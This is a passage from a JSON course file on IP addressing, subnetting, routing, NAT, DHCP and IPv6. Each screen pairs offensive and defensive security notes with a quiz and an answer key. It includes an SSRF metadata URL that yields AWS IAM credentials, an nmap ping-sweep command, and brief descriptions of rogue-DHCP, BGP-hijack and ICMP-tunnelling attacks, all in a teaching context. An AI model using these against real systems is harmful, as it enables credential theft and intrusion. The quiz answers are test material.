        "globalSource": 38,
        "title": "Historical Classful Addressing (A, B, C, D, E)",
        "summary": "The legacy system that divided the internet before CIDR took over.",
        "concept": "Originally, IP was divided into five rigid classes determined by leading bits:\n- Class A: 0.0.0.0 to 127.255.255.255 (Leading bit `0`). Default mask `/8` (255.0.0.0). 16,777,214 hosts per network.\n- Class B: 128.0.0.0 to 191.255.255.255 (Leading bits `10`). Default mask `/16` (255.255.0.0). 65,534 hosts.\n- Class C: 192.0.0.0 to 223.255.255.255 (Leading bits `110`). Default mask `/24` (255.255.255.0). 254 hosts.\n- Class D: 224.0.0.0 to 239.255.255.255 (Leading bits `1110`). Multicast groups.\n- Class E: 240.0.0.0 to 255.255.255.255 (Leading bits `1111`). Experimental/Reserved.",
        "cyberLens": {
          "offensive": "Early organizations (like IBM, Apple, MIT) were assigned entire Class A blocks (/8), meaning a single company owned 16.7 million public IPs, creating massive target surfaces.",
          "defensive": "Classful routing is obsolete; modern networks use Classless Inter-Domain Routing (CIDR) to allocate address blocks with arbitrary prefix lengths."
        },
        "keyPoints": [
          "Classful addressing wasted billions of addresses, leading to rapid IPv4 exhaustion.",
          "Class D multicast addresses (224.0.0.0/4) are used for routing updates and streaming.",
          "Leading bits determine the legacy class."
        ],
        "quiz": {
          "question": "Which legacy class does the IP address 172.20.10.5 belong to?",
          "options": [
            "Class A",
            "Class B",
            "Class C",
            "Class D"
          ],
          "answer": 1,
          "explanation": "Class B spans from 128.0.0.0 to 191.255.255.255. Therefore, 172.x.x.x is a legacy Class B address."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 39,
        "title": "RFC 1918 Private IP Ranges",
        "summary": "Non-routable internal IP blocks and the cornerstone of enterprise security.",
        "concept": "RFC 1918 reserved three private address blocks for internal networks that are NEVER routed over the public Internet:\n1. 10.0.0.0/8 (10.0.0.0 to 10.255.255.255): 1 single Class A equivalent (16.7M addresses). Standard for large enterprise data centers.\n2. 172.16.0.0/12 (172.16.0.0 to 172.31.255.255): 16 contiguous Class B equivalents (1M addresses).\n3. 192.168.0.0/16 (192.168.0.0 to 192.168.255.255): 256 contiguous Class C equivalents (65,536 addresses). Standard for home and SOHO networks.",
        "cyberLens": {
          "offensive": "Internal Reconnaissance: If an attacker compromises a web application that interacts with internal services (SSRF - Server-Side Request Forgery), targeting RFC 1918 IPs (e.g., `http://10.0.0.1/admin`) accesses unauthenticated internal microservices.",
          "defensive": "Bogon Filtering: Perimeter edge routers must drop any inbound traffic claiming a source IP from RFC 1918 ranges, as these represent IP spoofing attacks."
        },
        "keyPoints": [
          "Internet Service Providers (ISPs) drop RFC 1918 packets by design.",
          "Private networks require Network Address Translation (NAT) to access the public Internet.",
          "Bogon / Martian filters protect enterprise borders from fake internal traffic."
        ],
        "quiz": {
          "question": "Which of the following IP addresses is a publicly routable Internet IP and NOT an RFC 1918 private address?",
          "options": [
            "10.50.100.1",
            "172.25.1.99",
            "192.168.10.1",
            "172.35.10.5"
          ],
          "answer": 3,
          "explanation": "RFC 1918 covers 172.16.0.0 through 172.31.255.255. The address 172.35.10.5 is outside this range and is therefore a public Internet IP address."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 40,
        "title": "Special-Purpose & Reserved IPv4 Ranges",
        "summary": "Loopback, APIPA, Broadcast, Carrier-Grade NAT, and multicast definitions.",
        "concept": "- 127.0.0.0/8 (Loopback): Routes internally inside the host kernel without touching the physical network card (`127.0.0.1` = `localhost`).\n- 169.254.0.0/16 (APIPA / Link-Local): Auto-assigned by OS when DHCP server fails to respond.\n- 100.64.0.0/10 (Shared Address Space / CGNAT): Used by ISPs for Carrier-Grade NAT.\n- 0.0.0.0/0: Represents 'any IP' or default route in routing tables.\n- 255.255.255.255: Limited broadcast address (stays within local link).",
        "cyberLens": {
          "offensive": "Cloud Metadata API Exploitation: Cloud providers (AWS, GCP, Azure, DigitalOcean) host local instance metadata services at `http://169.254.169.254`. An SSRF vulnerability targeting this link-local IP allows attackers to steal cloud IAM credentials and tokens!",
          "defensive": "Enforce IMDSv2 (requiring token-based headers) and configure host egress firewall rules to block non-root access to `169.254.169.254`."
        },
        "keyPoints": [
          "APIPA (169.254.x.x) means DHCP failed and the device cannot reach the gateway.",
          "169.254.169.254 is the most famous link-local IP in cloud security.",
          "The entire 127.0.0.0/8 block (16.7M IPs) loops back to local host."
        ],
        "quiz": {
          "question": "Why is the IP address 169.254.169.254 of immense interest to cybersecurity penetration testers targeting AWS cloud environments?",
          "options": [
            "It is the main Google search engine IP.",
            "It hosts the AWS Instance Metadata Service (IMDS), which can leak temporary IAM role access keys via SSRF.",
            "It is the default password for all Cisco routers.",
            "It shuts down the cloud datacenter."
          ],
          "answer": 1,
          "explanation": "In AWS EC2, querying http://169.254.169.254/latest/meta-data/iam/security-credentials/ returns AWS IAM role secret keys if SSRF is present."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 41,
        "title": "Public IP Allocation & The RIR System",
        "summary": "How IANA, ARIN, RIPE, APNIC, AFRINIC, and LACNIC manage global IP space and ASN numbers.",
        "concept": "The Internet Assigned Numbers Authority (IANA) allocates large IP blocks to five Regional Internet Registries (RIRs):\n- ARIN: North America\n- RIPE NCC: Europe, Middle East, Central Asia\n- APNIC: Asia-Pacific\n- AFRINIC: Africa\n- LACNIC: Latin America & Caribbean\nOrganizations receive Autonomous System Numbers (ASNs) to announce their IP prefixes via Border Gateway Protocol (BGP).",
        "cyberLens": {
          "offensive": "OSINT & Attack Surface Mapping: WHOIS queries, ARIN lookups, and ASN IP range enumeration (e.g., using `amass` or `bgp.he.net`) reveal all public IP blocks owned by an enterprise target.",
          "defensive": "Resource Public Key Infrastructure (RPKI): Cryptographically signs BGP route origin authorizations (ROAs) to prevent unauthorized ASNs from hijacking enterprise IP prefixes."
        },
        "keyPoints": [
          "IANA delegates IP blocks to regional RIRs.",
          "An ASN is required to participate in global BGP routing.",
          "WHOIS and ASN mapping are the first steps of reconnaissance."
        ],
        "quiz": {
          "question": "Which regional registry (RIR) manages IP address allocations for Europe, the Middle East, and parts of Central Asia?",
          "options": [
            "ARIN",
            "APNIC",
            "RIPE NCC",
            "LACNIC"
          ],
          "answer": 2,
          "explanation": "RIPE NCC (Réseaux IP Européens Network Coordination Centre) is the RIR for Europe, the Middle East, and parts of Central Asia."
        }
      }
    ]
  },
  {
    "id": "09",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L3: subnetting & CIDR",
    "desc": "Use prefix lengths to find network boundaries, host ranges, and scan scope.",
    "screensCount": 6,
    "sourceRange": "SOURCE 42-47",
    "simulator": "cidr-subnet-calc",
    "badge": "Subnetting Master",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 42,
        "title": "The Purpose of Subnetting",
        "summary": "Controlling broadcast domains, conserving address space, and creating security boundaries.",
        "concept": "Subnetting divides a single large network into smaller, logically isolated sub-networks:\n1. Performance: Restricts broadcast traffic to smaller domains, preventing network congestion.\n2. Security: Isolates sensitive databases, servers, and payment processors into separate subnets from guest Wi-Fi and general user workstations.\n3. Routing Efficiency: Enables route summarization (aggregation), reducing the size of global routing tables.",
        "cyberLens": {
          "offensive": "Subnet Enumeration: Attackers use ping sweeps (`nmap -sn 192.168.1.0/24`) to identify active hosts in a subnet before scanning open ports.",
          "defensive": "Microsegmentation: Placing high-value systems in isolated /28 or /29 subnets with firewall inspection rules governing inter-subnet traffic."
        },
        "keyPoints": [
          "Subnetting turns a flat network into a structured hierarchy.",
          "Inter-subnet traffic MUST pass through a Layer 3 router or firewall.",
          "Shrinking subnets limits lateral movement of malware."
        ],
        "quiz": {
          "question": "Why does placing servers and workstations on separate subnets enhance network security?",
          "options": [
            "It makes computer screens turn off faster.",
            "Traffic between different subnets must pass through a router/firewall, where access control lists (ACLs) can filter and inspect packets.",
            "Subnetting makes Wi-Fi passwords obsolete.",
            "Workstations cannot send IP packets."
          ],
          "answer": 1,
          "explanation": "Because packets crossing subnet boundaries must be routed, security teams can place firewalls between subnets to enforce strict ACLs and inspect all inter-subnet communications."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 43,
        "title": "Classless Inter-Domain Routing (CIDR) Notation",
        "summary": "Prefix lengths, subnet masks, and counting contiguous network bits.",
        "concept": "CIDR notation specifies the number of leading binary '1' bits in the subnet mask:\n- `/24` = `11111111.11111111.11111111.00000000` = `255.255.255.0` (24 network bits, 8 host bits).\n- `/16` = `11111111.11111111.00000000.00000000` = `255.255.0.0` (16 network bits, 16 host bits).\n- `/28` = `11111111.11111111.11111111.11110000` = `255.255.255.240` (28 network bits, 4 host bits).",
        "cyberLens": {
          "offensive": "Scope Determination: A pen-testing Scope of Work defines authorized targets via CIDR (e.g. `10.20.0.0/22`). Scanning an IP outside the authorized CIDR prefix is a criminal violation (CFAA).",
          "defensive": "Firewall rules use CIDR prefixes to define security zones (e.g., allow `10.10.5.0/24` to access `10.20.1.10/32` on port 443)."
        },
        "keyPoints": [
          "CIDR prefix `/n` indicates the number of locked network bits.",
          "Remaining `32 - n` bits are available for host addressing.",
          "Total addresses in a `/n` prefix = 2^(32-n)."
        ],
        "quiz": {
          "question": "What is the dotted-decimal subnet mask representation of a /26 CIDR prefix?",
          "options": [
            "255.255.255.0",
            "255.255.255.128",
            "255.255.255.192",
            "255.255.255.224"
          ],
          "answer": 2,
          "explanation": "A /26 prefix has 26 ones. The fourth octet has two ones: 11000000 in binary = 128 + 64 = 192. So the mask is 255.255.255.192."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 44,
        "title": "The Golden Subnetting Math Formula",
        "summary": "Calculating Total Hosts, Usable Hosts, Network Address, and Broadcast Address.",
        "concept": "For any subnet with `H` host bits (where H = 32 - prefix length):\n- Total Addresses = 2^H\n- Usable Host Addresses = 2^H - 2\nWhy minus 2?\n1. First address (all host bits 0) = Network ID (identifies the subnet itself).\n2. Last address (all host bits 1) = Broadcast Address (sends to all hosts on the subnet).\nExample for `/27`:\n- H = 32 - 27 = 5 host bits.\n- Total IPs = 2^5 = 32.\n- Usable Hosts = 32 - 2 = 30.",
        "cyberLens": {
          "offensive": "Reconnaissance Scope Math: Knowing CIDR math allows red teams to quickly estimate target size: `/24` = 254 hosts, `/20` = 4,094 hosts, `/16` = 65,534 hosts.",
          "defensive": "Point-to-point router links use `/31` (RFC 3021, saves IPs without broadcast) or `/30` (4 IPs, 2 usable) to conserve valuable public addresses."
        },
        "keyPoints": [
          "Network ID has all 0s in host portion.",
          "Broadcast IP has all 1s in host portion.",
          "Usable host range spans strictly between Network ID and Broadcast IP."
        ],
        "quiz": {
          "question": "How many usable host IP addresses are available in a /28 subnet?",
          "options": [
            "16",
            "14",
            "30",
            "6"
          ],
          "answer": 1,
          "explanation": "In a /28 subnet: Host bits H = 32 - 28 = 4. Total IPs = 2^4 = 16. Usable hosts = 16 - 2 = 14."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 45,
        "title": "The Bitwise ANDing Operation: Local vs Remote",
        "summary": "How a host determines whether to send to a local MAC or forward to the Default Gateway.",
        "concept": "When Host A sends a packet to Destination IP, it must decide:\nIs Destination on my local subnet, or on a remote network?\nHow the kernel decides:\n1. Computes: `(My IP) AND (My Subnet Mask)` = My Network ID.\n2. Computes: `(Destination IP) AND (My Subnet Mask)` = Destination's Network ID in my mask.\n3. Comparison:\n   - If Match: Destination is LOCAL. Host sends ARP request for Destination's MAC.\n   - If Mismatch: Destination is REMOTE. Host sends ARP request for Default Gateway's MAC.",
        "cyberLens": {
          "offensive": "Subnet Mask Misconfiguration Exploits: If an administrator configures an overly broad mask (e.g., `/16` instead of `/24`), the host assumes remote hosts are local, sending ARP requests for remote public IPs and failing to communicate with the gateway.",
          "defensive": "Host-level verification: Troubleshooting connectivity begins with verifying `ipconfig` or `ip a` subnet mask matches gateway configuration."
        },
        "keyPoints": [
          "Bitwise AND rule: 1 AND 1 = 1, any other combination = 0.",
          "Gateways are only used when the destination is outside the local subnet.",
          "Local delivery uses destination MAC; remote delivery uses gateway MAC."
        ],
        "quiz": {
          "question": "If Host A (192.168.1.10/24) wants to send a packet to 192.168.2.20, what destination MAC address does Host A place on the Layer 2 Ethernet frame?",
          "options": [
            "The MAC address of 192.168.2.20",
            "The MAC address of Host A's Default Gateway router",
            "FF:FF:FF:FF:FF:FF",
            "00:00:00:00:00:00"
          ],
          "answer": 1,
          "explanation": "Through bitwise ANDing, Host A sees that 192.168.2.20 is on a different subnet. Therefore, it must forward the frame to its Default Gateway's MAC address."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 46,
        "title": "Subnet Boundary & Magic Number Trick",
        "summary": "The ultra-fast mental math method to calculate subnet ranges in seconds.",
        "concept": "The 'Magic Number' is the increment (block size) between subnets:\n1. Identify interesting octet (the one where the mask is neither 255 nor 0).\n2. Magic Number = `256 - (Subnet Mask in interesting octet)`.\nExample for `192.168.1.75/26`:\n- Subnet mask: `255.255.255.192`.\n- Interesting octet is 4th octet: 192.\n- Magic Number = `256 - 192 = 64`.\n- Subnet blocks start at multiples of 64: 0, 64, 128, 192.\n- 75 falls between 64 and 127:\n  - Network Address: `192.168.1.64`\n  - First Usable Host: `192.168.1.65`\n  - Last Usable Host: `192.168.1.126`\n  - Broadcast Address: `192.168.1.127`.",
        "cyberLens": {
          "offensive": "Fast scope calculation during CTFs and live engagements allows you to immediately identify boundary IPs without waiting for subnet calculators.",
          "defensive": "Prevent IP overlap: Overlapping subnets cause routing table conflicts and silent packet drops in enterprise routing."
        },
        "keyPoints": [
          "Magic Number = 256 minus the mask octet value.",
          "Subnet networks always begin at exact multiples of the Magic Number.",
          "Broadcast is always one less than the next subnet network ID."
        ],
        "quiz": {
          "question": "What is the broadcast address for the subnet containing host 10.0.0.50/29 (mask 255.255.255.248)?",
          "options": [
            "10.0.0.55",
            "10.0.0.63",
            "10.0.0.56",
            "10.0.0.51"
          ],
          "answer": 0,
          "explanation": "Magic number = 256 - 248 = 8. Multiples of 8: 0, 8, 16, 24, 32, 40, 48, 56. 50 falls in the block starting at 48. Next subnet starts at 56, so broadcast is 10.0.0.55."
        }
      },
      {
        "screenNumber": 6,
        "globalSource": 47,
        "title": "Subnetting for Enterprise Security Zones",
        "summary": "Designing DMZs, Management VLANs, User subnets, and Zero-Trust microsegments.",
        "concept": "A battle-tested enterprise subnet architecture isolates tiers:\n- DMZ (Demilitarized Zone) Subnet: Public-facing web/mail servers. Inbound from Internet allowed; outbound to internal strictly blocked.\n- Internal Server Subnet: Databases, Active Directory, application backends. Accessible only from DMZ via specific authorized ports.\n- Corporate Workstations Subnet: Employee laptops. Inbound from Internet blocked; outbound filtered via web proxy.\n- Management VLAN / Subnet: SSH/RDP/SNMP to switches, routers, firewalls. Isolated behind jump boxes and VPNs with MFA.",
        "cyberLens": {
          "offensive": "Pivot Attacks: If an attacker compromises a web server in the DMZ, a well-segmented network prevents direct connection to internal domain controllers.",
          "defensive": "Egress Filtering: Blocking outbound connections from database subnets prevents reverse shell callbacks even if remote code execution (RCE) occurs."
        },
        "keyPoints": [
          "Never mix public-facing servers and internal databases on the same subnet.",
          "Management interfaces must live on a dedicated out-of-band subnet.",
          "Default-deny firewall rules between all subnets enforce least privilege."
        ],
        "quiz": {
          "question": "Why should a public-facing web server in a DMZ be strictly prohibited from initiating new outbound connections into the internal database subnet?",
          "options": [
            "Because web servers cannot send SQL queries.",
            "If the web server is compromised, restricting outbound initiation prevents the attacker from pivoting laterally into the internal core network.",
            "Because DMZ cables are one-way only.",
            "To save internet bandwidth."
          ],
          "answer": 1,
          "explanation": "By only allowing the database to respond to established sessions, or restricting connections strictly to the DB port from specific IPs, an attacker who obtains a shell on the DMZ web server cannot scan or pivot into the internal network."
        }
      }
    ]
  },
  {
    "id": "10",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L3: header, ICMP & routing",
    "desc": "Read the IPv4 header and follow a packet through routing and fragmentation.",
    "screensCount": 5,
    "sourceRange": "SOURCE 48-52",
    "simulator": "ipv4-header-dissector",
    "badge": "Header & Routing",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 48,
        "title": "The IPv4 Header Bit-by-Bit",
        "summary": "Dissecting the 20-byte standard header: Version, IHL, DSCP, Length, TTL, Protocol, and Checksum.",
        "concept": "The standard IPv4 header contains minimum 20 bytes (up to 60 with options):\n1. Version (4 bits): Always 4 (0100) for IPv4.\n2. IHL (4 bits): Internet Header Length in 32-bit words (default 5 = 20 bytes).\n3. DSCP/ECN (8 bits): Quality of Service (QoS) and congestion notification.\n4. Total Length (16 bits): Entire packet size (header + data) in bytes (max 65,535).\n5. Identification (16 bits): Unique ID for reassembling fragmented packets.\n6. Flags (3 bits): Reserved (0), Don't Fragment (DF), More Fragments (MF).\n7. Fragment Offset (13 bits): Position of fragment in original datagram (in 8-byte units).\n8. Time to Live (TTL, 8 bits): Hop limit to prevent infinite loops (decremented by 1 at each router).\n9. Protocol (8 bits): Upper-layer protocol (1 = ICMP, 6 = TCP, 17 = UDP).\n10. Header Checksum (16 bits): Error checking for the header only.\n11. Source IP (32 bits) & Destination IP (32 bits).",
        "cyberLens": {
          "offensive": "TTL Fingerprinting: Operating systems set distinct initial TTL values (Linux/Android = 64, Windows = 128, Cisco/BSD = 255). Attackers determine victim OS remotely by observing TTL in ICMP/TCP replies.",
          "defensive": "TTL Normalization / Scrubbing: Firewalls overwrite outgoing TTLs to standard values to prevent remote OS fingerprinting."
        },
        "keyPoints": [
          "Minimum IPv4 header is 20 bytes (when IHL = 5).",
          "Protocol field tells the OS whether to pass payload to TCP (6), UDP (17), or ICMP (1).",
          "TTL decrements at every hop; at TTL = 0, the packet is discarded."
        ],
        "quiz": {
          "question": "What is the Protocol field value in the IPv4 header for a TCP segment?",
          "options": [
            "1",
            "6",
            "17",
            "80"
          ],
          "answer": 1,
          "explanation": "Protocol numbers: 1 = ICMP, 6 = TCP, 17 = UDP. (80 is a TCP port number, not an IP protocol number)."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 49,
        "title": "Packet Fragmentation & Attack Exploits",
        "summary": "Splitting datagrams across smaller MTUs and security evasion via tiny fragments.",
        "concept": "When an IP packet exceeds the outgoing link MTU and the DF (Don't Fragment) flag is 0:\n1. The router fragments the packet into multiple smaller packets.\n2. Each fragment carries the same Identification number.\n3. The More Fragments (MF) flag is set to 1 for all fragments except the final one.\n4. Fragment Offset specifies the exact data offset (divided by 8).\n5. The destination host reassembles the fragments before passing to L4.",
        "cyberLens": {
          "offensive": "Fragmentation Evasion & Teardrop Attacks: Attackers craft overlapping or out-of-order fragment offsets to bypass stateless IDS/IPS or crash legacy OS kernels (Teardrop attack). Tiny Fragments split TCP headers across packets to hide port numbers.",
          "defensive": "Virtual Reassembly: Modern Next-Gen Firewalls reassemble all IP fragments in memory before inspecting and forwarding them."
        },
        "keyPoints": [
          "Fragmentation happens on routers; reassembly happens ONLY at the final destination.",
          "If any single fragment is dropped, the entire packet must be retransmitted.",
          "Path MTU Discovery (PMTUD) uses DF=1 to find the lowest MTU on the path."
        ],
        "quiz": {
          "question": "What happens if a router needs to forward a 1500-byte packet onto an interface with an MTU of 1400 bytes, but the packet has the DF (Don't Fragment) flag set to 1?",
          "options": [
            "The router fragments the packet anyway.",
            "The router drops the packet and sends an ICMP 'Destination Unreachable - Fragmentation Needed' message back to the sender.",
            "The router increases its physical cable MTU.",
            "The packet is converted to UDP."
          ],
          "answer": 1,
          "explanation": "When DF=1, the router is explicitly forbidden from fragmenting. It drops the packet and notifies the sender using ICMP Type 3 Code 4 (Fragmentation Needed), enabling Path MTU Discovery."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 50,
        "title": "Internet Control Message Protocol (ICMP)",
        "summary": "Diagnostics, error reporting, Ping, and how Traceroute uses TTL expiration.",
        "concept": "ICMP (Protocol 1) reports network errors and diagnostic conditions:\n- Type 8, Code 0: Echo Request (Ping query).\n- Type 0, Code 0: Echo Reply (Ping response).\n- Type 3: Destination Unreachable (Code 0: Net, Code 1: Host, Code 3: Port unreachable).\n- Type 11, Code 0: Time-to-Live Exceeded in Transit.\nHow Traceroute Works:\n1. Sends packet with TTL = 1 -> First router decrements to 0, drops packet, returns ICMP Type 11 (Hop 1 discovered!).\n2. Sends packet with TTL = 2 -> Second router drops, returns ICMP Type 11 (Hop 2 discovered!).\n3. Repeats incrementally until reaching destination.",
        "cyberLens": {
          "offensive": "ICMP Tunneling (e.g. `iodine`, `ptunnel`): Malware encapsulates covert C2 traffic inside the data payload of ICMP Echo Request packets to bypass restrictive outbound firewalls.",
          "defensive": "Deep packet inspection inspects ICMP payload size and entropy, dropping ICMP packets with abnormal payloads or rate-limiting ICMP."
        },
        "keyPoints": [
          "Ping uses ICMP Type 8 (Request) and Type 0 (Reply).",
          "Traceroute leverages the TTL Exceeded (Type 11) error mechanism.",
          "Port unreachable (Type 3 Code 3) indicates closed UDP ports."
        ],
        "quiz": {
          "question": "Which ICMP message type and code are returned by an intermediate router to make Traceroute hop discovery work?",
          "options": [
            "Type 8 Code 0 (Echo Request)",
            "Type 0 Code 0 (Echo Reply)",
            "Type 11 Code 0 (Time to Live Exceeded in Transit)",
            "Type 3 Code 3 (Port Unreachable)"
          ],
          "answer": 2,
          "explanation": "Traceroute sends packets with incremental TTLs (1, 2, 3...). When an intermediate router decrements TTL to 0, it discards the packet and sends back ICMP Type 11 Code 0 (TTL Exceeded), revealing its IP."
        }
      },
      {
        "screenNumber": 4,
        "globalSource": 51,
        "title": "Routing Tables & The Forwarding Engine",
        "summary": "Longest Prefix Match, Default Gateways, Metric, and Next-Hop resolution.",
        "concept": "A routing table determines how a router forwards an incoming packet:\n1. Table entries list: Destination Network CIDR, Next-Hop IP, Outgoing Interface, Metric.\n2. Longest Prefix Match Rule: If multiple routes match a destination IP, the router selects the route with the longest (most specific) prefix mask!\nExample:\n- Route A: `10.0.0.0/8` via Interface 1\n- Route B: `10.1.0.0/16` via Interface 2\n- Route C: `10.1.5.0/24` via Interface 3\nFor destination `10.1.5.88`, Route C (/24) is chosen because 24 > 16 > 8.\n3. Default Route (`0.0.0.0/0`): The fallback route used when no specific match exists.",
        "cyberLens": {
          "offensive": "BGP Prefix Hijacking: Attackers announce a more specific route (e.g., announcing `/24` when the legitimate owner announces `/22`). Because of the Longest Prefix Match rule, global internet traffic diverts to the attacker's AS!",
          "defensive": "Route validation with RPKI and strict egress prefix filtering prevents rogue route advertisements."
        },
        "keyPoints": [
          "The Longest Prefix Match always wins, regardless of route metric or protocol.",
          "0.0.0.0/0 is the 'gateway of last resort'.",
          "Inspect local host routing table with `route print` (Windows) or `ip route` (Linux)."
        ],
        "quiz": {
          "question": "If a router has matching routes for 192.168.1.0/24 and 192.168.0.0/16, which route will it use to forward a packet addressed to 192.168.1.50?",
          "options": [
            "192.168.0.0/16 because it has more addresses.",
            "192.168.1.0/24 because of the Longest Prefix Match rule.",
            "It drops the packet due to collision.",
            "It splits the packet in half between both routes."
          ],
          "answer": 1,
          "explanation": "Routers always prioritize the most specific route (the one with the longest prefix mask length). /24 is more specific than /16."
        }
      },
      {
        "screenNumber": 5,
        "globalSource": 52,
        "title": "Routing Protocols: Static, OSPF, and BGP",
        "summary": "Internal Gateway Protocols (IGP) vs External Gateway Protocols (EGP) and BGP security.",
        "concept": "- Static Routing: Manually configured routes. Secure and predictable, but fails when topology changes.\n- OSPF (Open Shortest Path First): Link-State IGP using Dijkstra's algorithm. Rapid convergence within an enterprise autonomous system.\n- BGP (Border Gateway Protocol): Path-Vector EGP that glues the entire Internet together. Exchanges reachability between independent Autonomous Systems (ASNs).",
        "cyberLens": {
          "offensive": "BGP Route Leak / Hijack: By falsely announcing ownership of YouTube's or cryptocurrency services' IP prefixes, rogue state actors or attackers intercept traffic, steal crypto, or cause global blackouts.",
          "defensive": "BGP Route Filtering, Peer Authentication (MD5/TCP-AO), and RPKI Route Origin Authorization."
        },
        "keyPoints": [
          "OSPF is used INSIDE an organization; BGP is used BETWEEN organizations.",
          "BGP makes decisions based on policy, AS path length, and business agreements.",
          "The internet's biggest systemic vulnerability is unauthenticated BGP peering."
        ],
        "quiz": {
          "question": "Which protocol is the primary routing protocol responsible for exchanging routing information between different Autonomous Systems across the global Internet?",
          "options": [
            "OSPF",
            "RIP",
            "BGP (Border Gateway Protocol)",
            "ICMP"
          ],
          "answer": 2,
          "explanation": "BGP is the exterior gateway protocol that powers the global Internet, routing traffic across thousands of independent autonomous systems."
        }
      }
    ]
  },
  {
    "id": "11",
    "module": "03 / ADDRESSING AND TRANSPORT",
    "title": "L3: NAT, DHCP & IPv6",
    "desc": "Learn how hosts receive addresses and how NAT and IPv6 change the path.",
    "screensCount": 4,
    "sourceRange": "SOURCE 53-56",
    "simulator": "nat-dhcp-simulator",
    "badge": "Address Transition",
    "screens": [
      {
        "screenNumber": 1,
        "globalSource": 53,
        "title": "Network Address Translation (NAT) & PAT",
        "summary": "Static NAT, Dynamic NAT, and Port Address Translation (NAT Overload).",
        "concept": "NAT translates private RFC 1918 addresses into public routable IPs:\n- Static NAT (1:1): Maps one private IP to one public IP (used for hosting internal web servers).\n- Dynamic NAT (Many:Many): Maps private hosts to a pool of public IPs.\n- Port Address Translation (PAT / NAT Overload): Maps thousands of internal private IPs to a SINGLE public IP by tracking unique source Layer 4 port numbers in a NAT State Table:\n  - Internal: `192.168.1.50:52140` -> NAT Router translates to -> `203.0.113.1:40001`.\n  - Remote server replies to `203.0.113.1:40001` -> NAT translates back to `192.168.1.50:52140`.",
        "cyberLens": {
          "offensive": "NAT Blindness: When a cybercrime or web attack originates from behind a corporate PAT gateway, external server logs only record the single public IP, shielding the specific internal workstation identity.",
          "defensive": "Correlate internal DHCP and firewall NAT state translation logs with external web server timestamps during digital forensics triage."
        },
        "keyPoints": [
          "PAT is why entire households and offices can browse the web using one public IP.",
          "NAT provides accidental inbound obscurity, but is NOT a substitute for a firewall.",
          "NAT alters the IP and Port headers and recalculates checksums on the fly."
        ],
        "quiz": {
          "question": "How does Port Address Translation (PAT / NAT Overload) allow hundreds of internal computers to share a single public IPv4 address simultaneously?",
          "options": [
            "By assigning different MAC addresses to each website.",
            "By tracking unique Layer 4 source port numbers for each outbound connection in a state table.",
            "By compressing IP packets into binary zip files.",
            "By turning off TCP."
          ],
          "answer": 1,
          "explanation": "PAT tracks each internal host's session by mapping its internal IP and ephemeral source port to a unique source port on the router's single public IP."
        }
      },
      {
        "screenNumber": 2,
        "globalSource": 54,
        "title": "Dynamic Host Configuration Protocol (DHCP) & DORA",
        "summary": "The 4-step DORA process: Discover, Offer, Request, Acknowledge.",
        "concept": "DHCP automates network configuration (IP, Subnet Mask, Gateway, DNS):\n1. Discover (Client -> Broadcast): 'I need an IP!' (UDP Dst Port 67, Src Port 68).\n2. Offer (Server -> Unicast/Broadcast): 'Here is 192.168.1.50 with a 24-hour lease'.\n3. Request (Client -> Broadcast): 'I accept 192.168.1.50 from DHCP Server 192.168.1.1'.\n4. Acknowledge (Server -> Unicast/Broadcast): 'Confirmed! Here are your DNS and Gateway settings'.",
        "cyberLens": {
          "offensive": "Rogue DHCP Server & Starvation: Attackers flood DHCP with fake MACs to exhaust available IP pools (Starvation), then launch a Rogue DHCP server handing out the attacker's IP as Default Gateway and DNS, achieving instant MITM!",
          "defensive": "DHCP Snooping: Switch drops DHCP Offer/Ack packets arriving on untrusted user ports, permitting them only from designated trusted uplink ports."
        },
        "keyPoints": [
          "Remember DORA: Discover, Offer, Request, Acknowledge.",
          "DHCP runs over UDP: Server listens on port 67, Client on port 68.",
          "DHCP Snooping is vital to prevent Rogue DHCP attacks."
        ],
        "quiz": {
          "question": "What attack occurs when a rogue actor introduces an unauthorized DHCP server into a corporate network?",
          "options": [
            "The rogue server provides its own IP as the Default Gateway and DNS to connecting clients, allowing total traffic interception.",
            "All switches physically power off.",
            "The router deletes its firmware.",
            "The attacker becomes the CEO."
          ],
          "answer": 0,
          "explanation": "A rogue DHCP server hands out malicious network configurations to unsuspecting clients, pointing their default gateway and DNS to the attacker's machine for full MITM interception."
        }
      },
      {
        "screenNumber": 3,
        "globalSource": 55,
        "title": "IPv6: Structure & Compression Rules",
        "summary": "128 bits, hexadecimal representation, zero-compression rules, and address types.",
        "concept": "IPv6 expands address space to 128 bits (3.4 x 10^38 addresses) written as 8 groups of 4 hex digits:\n`2001:0db8:85a3:0000:0000:8a2e:0370:7334`\nTwo compression rules:\n1. Omit leading zeros in any group: `0000` -> `0`, `0db8` -> `db8`.\n2. Replace consecutive groups of all zeros with `::` (can only be used ONCE per address!).\nCompressed: `2001:db8:85a3::8a2e:370:7334`.\nKey Address Types:\n- Global Unicast (`2000::/3`): Public Internet routable.\n- Link-Local (`fe80::/10`): Mandatory auto-configured for single link communication.\n- Unique Local (`fc00::/7`): Private RFC 1918 equivalent.\n- Loopback (`::1`).",
        "cyberLens": {
          "offensive": "IPv6 Shadow Network Exploitation: Many enterprises enable IPv6 in Windows by default while only monitoring IPv4 firewalls. Attackers utilize IPv6 link-local traffic or rogue router advertisements (mitm6) to compromise Windows Active Directory via DHCPv6 and DNS injection!",
          "defensive": "Either fully secure, monitor, and firewall IPv6 across all enterprise switches and endpoints, or administratively disable IPv6 if unused."
        },
        "keyPoints": [
          "IPv6 has 128 bits; IPv4 has 32 bits.",
          "No broadcast addresses exist in IPv6; all broadcast functions are replaced by Multicast.",
          "Every IPv6 interface automatically configures a link-local address starting with fe80::."
        ],
        "quiz": {
          "question": "What is the fully compressed notation of the IPv6 address 2001:0db8:0000:0000:0000:0000:0000:0001?",
          "options": [
            "2001:db8:0:0:0:0:0:1",
            "2001:db8::1",
            "2001:db8:::1",
            "2001:db8:0::1"
          ],
          "answer": 1,
